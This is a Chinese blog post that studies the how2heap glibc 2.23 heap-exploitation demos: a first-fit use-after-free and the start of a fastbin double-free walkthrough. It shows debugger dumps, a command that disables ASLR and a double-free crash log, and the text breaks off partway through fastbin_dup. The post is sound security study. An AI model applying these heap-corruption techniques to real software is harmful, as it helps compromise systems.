<!DOCTYPE html>
<html lang="zh-cn">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="how2heap - 1"/><meta name="keywords" content="pwn, QRZ's Blog" /><link rel="alternate" href="/blog/default" title="QRZ's Blog" ><link rel="shortcut icon" type="image/x-icon" href="/blog/favicon.ico?v=2.11.0" />
<link rel="canonical" href="http://www.qrzbing.cn/blog/2019/07/08/how2heap-1/"/>

<link rel="stylesheet" type="text/css" href="/blog/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/blog/css/style.css?v=2.11.0" />

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
</script>

    <title>how2heap - 1 - QRZ's Blog</title>
  <meta name="generator" content="Hexo 5.3.0"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/blog/." class="logo">QRZ's Blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/blog/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/blog/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/blog/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/blog/categories/">
        <li class="mobile-menu-item">Categories
          </li>
      </a><a href="/blog/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/blog/." class="logo">QRZ's Blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/blog/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/categories/">
            Categories
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">how2heap - 1
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-07-08
        </span></div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#how2heap-1"><span class="toc-text">how2heap - 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#first-fit"><span class="toc-text">first_fit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E5%BA%8F"><span class="toc-text">顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-text">解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup"><span class="toc-text">fastbin_dup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%EF%BC%9A"><span class="toc-text">输出：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-1"><span class="toc-text">解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-into-stack"><span class="toc-text">fastbin_dup_into_stack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA"><span class="toc-text">输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E5%BA%8F-1"><span class="toc-text">顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-2"><span class="toc-text">解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-consolidate"><span class="toc-text">fastbin_dup_consolidate</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%EF%BC%9A-1"><span class="toc-text">输出：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E5%BA%8F%EF%BC%9A"><span class="toc-text">顺序：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-text">解释：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol>
    </div>
  </div><div class="post-content"><h1 id="how2heap-1"><a href="#how2heap-1" class="headerlink" title="how2heap - 1"></a>how2heap - 1</h1><p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">how2heap</a></p>
<a id="more"></a>

<p>我本地的 glibc 环境是 2.23 (Ubuntu 16.04 LTS)</p>
<p>查看 ASLR:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="comment"># case 0:</span></span><br><span class="line"><span class="comment">#   关闭ASLR</span></span><br><span class="line"><span class="comment"># case 1:</span></span><br><span class="line"><span class="comment">#   mmap base、stack、vdso page将随机化。这意味着.so文件将被加载到随机地址。链接时指定了-pie选项的可执行程序，其代码段加载地址将被随机化。配置内核时如果指定了CONFIG_COMPAT_BRK，randomize_va_space缺省为1。此时heap没有随机化。</span></span><br><span class="line"><span class="comment"># case 2:</span></span><br><span class="line"><span class="comment">#    在1的基础上增加了heap随机化。配置内核时如果禁用CONFIG_COMPAT_BRK，randomize_va_space缺省为2。</span></span><br></pre></td></tr></table></figure>
<p>关闭 ASLR</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>
<p>开始做的时候没关随机化，所以地址看起来会比较奇怪。</p>
<h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited in a use-after-free situation.</span><br><span class="line">Allocating 2 buffers. They can be large, don&#39;t have to be fastbin.</span><br><span class="line">1st malloc(512): 0x55b640246010</span><br><span class="line">2nd malloc(256): 0x55b640246220</span><br><span class="line">we could continue mallocing here...</span><br><span class="line">now let&#39;s put a string at a that we can read later &quot;this is A!&quot;</span><br><span class="line">first allocation 0x55b640246010 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don&#39;t need to free anything again. As long as we allocate less than 512, it will end up at 0x55b640246010</span><br><span class="line">So, let&#39;s allocate 500 bytes</span><br><span class="line">3rd malloc(500): 0x55b640246010</span><br><span class="line">And put a different string here, &quot;this is C!&quot;</span><br><span class="line">3rd allocation 0x55b640246010 points to this is C!</span><br><span class="line">first allocation 0x55b640246010 points to this is C!</span><br></pre></td></tr></table></figure>
<h3 id="顺序"><a href="#顺序" class="headerlink" title="顺序"></a>顺序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; malloc(512)</span><br><span class="line">b &#x3D; malloc(256)</span><br><span class="line">strcpy(a, &quot;this is A!&quot;)</span><br><span class="line">free(a)</span><br><span class="line">c &#x3D; malloc(500)</span><br><span class="line">strcpy(c, &quot;this is C!&quot;)</span><br><span class="line">show(c_addr)</span><br><span class="line">show(a_addr)</span><br></pre></td></tr></table></figure>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>首先分配一个 512 大小的块，地址为 0x55b640246010，再分配一个大小为 256 的块，地址为 0x55b640246220。</p>
<p>此时堆状态如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x555555757000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 529, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555757210 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 273, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555757320 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 134369, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后向 A 中写入字符串：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0x555555757000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 529, </span><br><span class="line">  fd &#x3D; 0x2073692073696874, </span><br><span class="line">  bk &#x3D; 0x2141, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x555555757000</span><br><span class="line">0x555555757000:	0x0	0x211</span><br><span class="line">0x555555757010:	0x2073692073696874	0x2141</span><br><span class="line">0x555555757020:	0x0	0x0</span><br><span class="line">0x555555757030:	0x0	0x0</span><br><span class="line">0x555555757040:	0x0	0x0</span><br><span class="line">0x555555757050:	0x0	0x0</span><br><span class="line">0x555555757060:	0x0	0x0</span><br><span class="line">0x555555757070:	0x0	0x0</span><br><span class="line">0x555555757080:	0x0	0x0</span><br><span class="line">0x555555757090:	0x0	0x0</span><br><span class="line">pwndbg&gt; x&#x2F;5s 0x555555757010</span><br><span class="line">0x555555757010:	&quot;this is A!&quot;</span><br><span class="line">0x55555575701b:	&quot;&quot;</span><br><span class="line">0x55555575701c:	&quot;&quot;</span><br><span class="line">0x55555575701d:	&quot;&quot;</span><br><span class="line">0x55555575701e:	&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>接下来释放 chunk a。由于 a 的大小为 512，不适于 fastbins，glibc 会将这个 chunk 放入 unsortedbin。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757000</span><br></pre></td></tr></table></figure>
<p>原因：</p>
<ol>
<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
<li>当进行 malloc_consolidate 时，如果不是和 top chunk 近邻的话，可能会把合并后的 chunk 放到 unsorted bin 中。</li>
</ol>
<p>More:</p>
<ol>
<li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li>
<li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li>
</ol>
<p>再申请一个大小为 500 的块，因为这一块和我们之前 free 的那块大小差不多，系统会优先从 bins 里找到一个合适的 chunk 把他取出来再使用。</p>
<p>这里向 C 中写入 <code>&quot;this is C&quot;</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0x555555757000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 529, </span><br><span class="line">  fd &#x3D; 0x2073692073696874, </span><br><span class="line">  bk &#x3D; 0x7ffff7002143, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x555555757000</span><br><span class="line">0x555555757000:	0x0	0x211</span><br><span class="line">0x555555757010:	0x2073692073696874	0x7ffff7002143</span><br><span class="line">0x555555757020:	0x0	0x0</span><br><span class="line">0x555555757030:	0x0	0x0</span><br><span class="line">0x555555757040:	0x0	0x0</span><br><span class="line">0x555555757050:	0x0	0x0</span><br><span class="line">0x555555757060:	0x0	0x0</span><br><span class="line">0x555555757070:	0x0	0x0</span><br><span class="line">0x555555757080:	0x0	0x0</span><br><span class="line">0x555555757090:	0x0	0x0</span><br><span class="line">pwndbg&gt; x&#x2F;5s 0x555555757010</span><br><span class="line">0x555555757010:	&quot;this is C!&quot;</span><br><span class="line">0x55555575701b:	&quot;\367\377\177&quot;</span><br><span class="line">0x55555575701f:	&quot;&quot;</span><br><span class="line">0x555555757020:	&quot;&quot;</span><br><span class="line">0x555555757021:	&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>unsortedbin 也被取出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br></pre></td></tr></table></figure>
<p>这时可以发现，C 的位置也是 A 的位置，我们打印 a 的内容也会输出 <code>&quot;this is C&quot;</code>。这是一个明显的 UAF(Use After Free) 漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;a</span><br><span class="line">$2 &#x3D; (char **) 0x7fffffffdc68</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x7fffffffdc68</span><br><span class="line">0x7fffffffdc68:	0x555555757010	0x555555757220</span><br><span class="line">0x7fffffffdc78:	0x555555757010	0x7fffffffdd70</span><br><span class="line">0x7fffffffdc88:	0x0	0x555555554a20 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffdc98:	0x7ffff7a2d830 &lt;__libc_start_main+240&gt;	0x1</span><br><span class="line">0x7fffffffdca8:	0x7fffffffdd78	0x1f7ffcca0</span><br><span class="line">0x7fffffffdcb8:	0x55555555475a &lt;main&gt;	0x0</span><br><span class="line">0x7fffffffdcc8:	0xf9f925f8975b0ef5	0x555555554650 &lt;_start&gt;</span><br><span class="line">0x7fffffffdcd8:	0x7fffffffdd70	0x0</span><br><span class="line">0x7fffffffdce8:	0x0	0xacac70adba5b0ef5</span><br><span class="line">0x7fffffffdcf8:	0xacac6017accb0ef5	0x0</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x555555757010</span><br><span class="line">0x555555757010:	0x2073692073696874	0x7ffff7002143</span><br><span class="line">0x555555757020:	0x0	0x0</span><br><span class="line">0x555555757030:	0x0	0x0</span><br><span class="line">0x555555757040:	0x0	0x0</span><br><span class="line">0x555555757050:	0x0	0x0</span><br><span class="line">0x555555757060:	0x0	0x0</span><br><span class="line">0x555555757070:	0x0	0x0</span><br><span class="line">0x555555757080:	0x0	0x0</span><br><span class="line">0x555555757090:	0x0	0x0</span><br><span class="line">0x5555557570a0:	0x0	0x0</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$3 &#x3D; 0x555555757010 &quot;this is C!&quot;</span><br></pre></td></tr></table></figure>
<p>UAF 出现的原因：指针 free 之后没有置 0。</p>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>这道题讲了 fastbin 机制下的 double free。</p>
<h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x602010</span><br><span class="line">2nd malloc(8): 0x602030</span><br><span class="line">3rd malloc(8): 0x602050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x602010 again, things will crash because 0x602010 is at the top of the free list.</span><br><span class="line">So, instead, we&#39;ll free 0x602030.</span><br><span class="line">Now, we can free 0x602010 again, since it&#39;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x602010, 0x602030, 0x602010 ]. If we malloc 3 times, we&#39;ll get 0x602010 twice!</span><br><span class="line">1st malloc(8): 0x602010</span><br><span class="line">2nd malloc(8): 0x602030</span><br><span class="line">3rd malloc(8): 0x602010</span><br></pre></td></tr></table></figure>
<h3 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17</span>: <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="number">18</span>: <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">19</span>:</span><br><span class="line"><span class="number">20</span>: <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="number">21</span>: <span class="comment">// free(a);</span></span><br><span class="line"><span class="number">22</span>:</span><br><span class="line"><span class="number">23</span>: <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="number">24</span>: <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure>
<p>如果我们首先把第 21 行的注释去掉，会报这样的错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x602010</span><br><span class="line">2nd malloc(8): 0x602030</span><br><span class="line">3rd malloc(8): 0x602050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x602010 again, things will crash because 0x602010 is at the top of the free list.</span><br><span class="line">*** Error in &#96;.&#x2F;fastbin_dup&#39;: double free or corruption (fasttop): 0x0000000000602010 ***</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Backtrace: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(+0x777e5)[0x7ffff7a847e5]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(+0x8037a)[0x7ffff7a8d37a]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(cfree+0x4c)[0x7ffff7a9153c]</span><br><span class="line">.&#x2F;fastbin_dup[0x400762]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d830]</span><br><span class="line">.&#x2F;fastbin_dup[0x400579]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Memory map: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">00400000-00401000 r-xp 00000000 08:01 3546821                            &#x2F;home&#x2F;qrz&#x2F;pwn&#x2F;how2heap&#x2F;fastbin_dup</span><br><span class="line">00600000-00601000 r--p 00000000 08:01 3546821                            &#x2F;home&#x2F;qrz&#x2F;pwn&#x2F;how2heap&#x2F;fastbin_dup</span><br><span class="line">00601000-00602000 rw-p 00001000 08:01 3546821                            &#x2F;home&#x2F;qrz&#x2F;pwn&#x2F;how2heap&#x2F;fastbin_dup</span><br><span class="line">00602000-00623000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 </span><br><span class="line">7ffff77f7000-7ffff780d000 r-xp 00000000 08:01 1837020                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7ffff780d000-7ffff7a0c000 ---p 00016000 08:01 1837020                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:01 1837020                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 1832172                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7ffff7fdb000-7ffff7fde000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 1832172                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 1832172                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line">[1]    55675 abort (core dumped)  .&#x2F;fastbin_dup</span><br></pre></td></tr></table></figure>
<p>这是一个典型的 double free，因为一个已经 free 掉的 chunk 是不能被 free 第二次的。接下来我们把注释加上，重新编译运行。编译方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -no-pie -o fastbin_dup.c -o fastbin_dup</span><br></pre></td></tr></table></figure>
<p>首先 malloc 了三个 chunk</p>
